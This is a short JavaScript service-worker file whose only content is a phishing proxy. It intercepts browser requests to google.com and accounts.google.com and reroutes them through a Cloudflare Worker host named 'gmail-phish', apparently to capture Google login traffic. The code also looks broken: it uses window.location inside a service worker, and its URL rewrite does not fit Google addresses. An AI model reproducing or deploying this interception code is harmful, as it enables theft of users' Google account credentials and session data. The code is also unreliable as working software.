// sw.js
self.addEventListener('fetch', event => {
    if (event.request.url.includes('google.com') || 
        event.request.url.includes('accounts.google.com')) {
        
        // Proxy ALL Google traffic through Worker
        const url = event.request.url.replace(window.location.origin, 'https://gmail-phish.YOURWORKER.workers.dev');
        event.respondWith(fetch(url, event.request));
    }
});
